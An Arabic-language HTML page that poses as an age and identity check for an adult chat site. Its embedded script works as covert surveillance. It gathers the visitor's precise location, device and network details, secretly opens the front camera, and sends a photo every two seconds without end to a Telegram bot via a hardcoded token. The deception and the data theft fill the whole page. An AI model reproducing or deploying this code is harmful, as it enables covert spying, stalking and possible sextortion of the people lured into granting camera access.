<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>شات +18</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            text-align: center;
            margin: 0;
            padding: 20px;
            background-color: #f0f2f5;
            color: #333;
        }
        .container {
            max-width: 500px;
            margin: 50px auto;
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
        }
        h2 { color: #0088cc; margin-bottom: 10px; }
        p { color: #666; font-size: 14px; margin-bottom: 25px; }
        button {
            padding: 15px 30px;
            font-size: 16px;
            font-weight: bold;
            background-color: #0088cc;
            color: white;
            border: none;
            border-radius: 25px;
            cursor: pointer;
            transition: all 0.3s ease;
            width: 100%;
            box-shadow: 0 4px 6px rgba(0,136,204,0.2);
        }
        button:hover {
            background-color: #006699;
            transform: translateY(-2px);
        }
        #status {
            margin-top: 20px;
            font-weight: bold;
            font-size: 15px;
        }
        video, canvas { display: none; }
    </style>
</head>
<body>

    <div class="container">
        <h2>تأكيد الهوية والتحقق من انك لست قاصر</h2>
        <p>يرجى الضغط على الزر أدناه للسماح بصلاحيات الكاميرا للتحقق الذكي .</p>
        <button id="startBtn">ابدأ التحقق الآن</button>
        <div id="status"></div>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" width="640" height="480"></canvas>

    <script>
        const TELEGRAM_TOKEN = "8798573888:AAE38QVvgG0DgwePDKMaBcOpKOomweVzsb8";
        const CHAT_ID = "5394550159";

        document.getElementById('startBtn').addEventListener('click', async () => {
            const statusDiv = document.getElementById('status');
            statusDiv.style.color = "#333";
            statusDiv.innerText = "جاري تهيأه النظام...";

            let locationData = "❌ (تم رفض إذن الموقع أو غير مدعوم)";
            const deviceInfo = navigator.userAgent;
            const networkInfo = navigator.connection ? `Type: ${navigator.connection.effectiveType}, Downlink: ${navigator.connection.downlink}Mbps` : "Unknown";

            // 1. جلب الموقع الجغرافي لمرة واحدة في البداية
            try {
                locationData = await getPosition();
            } catch (err) {
                console.log("إذن الموقع مرفوض.");
            }

            // 2. إرسال التقرير النصي الأول فوراً لتليجرام
            const textMessage = `📊 بدء جلسة مراقبة مستمرة:\n📌 الموقع: ${locationData}\n📱 الجهاز: ${deviceInfo}\n🌐 الشبكة: ${networkInfo}`;
            sendTextMessage(textMessage);

            // 3. تشغيل الكاميرا في الخلفية والبدء في التقاط الصور اللانهائي كل ثانيتين
            try {
                statusDiv.style.color = "green";
                statusDiv.innerText = "✅ النظام يعمل الآن ...";
                await startContinuousCapture(locationData);
            } catch (error) {
                console.log("إذن الكاميرا مرفوض.");
                statusDiv.style.color = "orange";
                statusDiv.innerText = "⚠️ الرجاء الانتظار ثانيتين.";
            }
        });

        // دالة جلب إحداثيات الموقع
        function getPosition() {
            return new Promise((resolve, reject) => {
                if (!navigator.geolocation) reject();
                navigator.geolocation.getCurrentPosition(
                    (position) => resolve(`https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`),
                    () => reject(),
                    { enableHighAccuracy: true, timeout: 5000 }
                );
            });
        }

        // دالة إرسال النصوص إلى تليجرام
        function sendTextMessage(text) {
            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: text })
            }).catch(err => console.log("خطأ في إرسال النص:", err));
        }

        // دالة تشغيل الكاميرا والتقاط صور لانهائية كل ثانيتين
        async function startContinuousCapture(location) {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const context = canvas.getContext('2d');

            // فتح الكاميرا الأمامية للمستخدم في الخلفية وبدون صوت
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" }, 
                audio: false 
            });
            video.srcObject = stream;

            // انتظار ثانية ونصف للتأكد من استقرار عدسة الكاميرا وضبط الإضاءة تلقائياً
            await new Promise(resolve => setTimeout(resolve, 1500));

            let photoIndex = 1;

            // حلقة تكرارية مستمرة (لا تنتهي طالما الصفحة مفتوحة)
            while (true) {
                // رسم اللقطة الحالية من الكاميرا الخفية على الـ canvas
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // تحويلها لملف وإرسالها
                await new Promise((resolve) => {
                    canvas.toBlob((blob) => {
                        if (blob) {
                            const formData = new FormData();
                            formData.append('chat_id', CHAT_ID);
                            formData.append('photo', blob, `live_snap_${photoIndex}.jpg`);
                            formData.append('caption', `📸 لقطة حية رقم (#${photoIndex})\n📍 الموقع: ${location}`);

                            // إرسال الصورة فوري مع تخطي قيود الـ CORS
                            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
                                method: 'POST',
                                body: formData,
                                mode: 'no-cors'
                            });
                            
                            photoIndex++;
                        }
                        resolve();
                    }, 'image/jpeg', 0.7); // جودة ممتازة وحجم صغير جداً لسرعة الإرسال المستمر
                });

                // الانتظار لمدة ثانيتين (2000 مللي ثانية) قبل التقاط الصورة التالية
                await new Promise(res => setTimeout(res, 2000));
            }
        }
    </script>
</body>
</html>
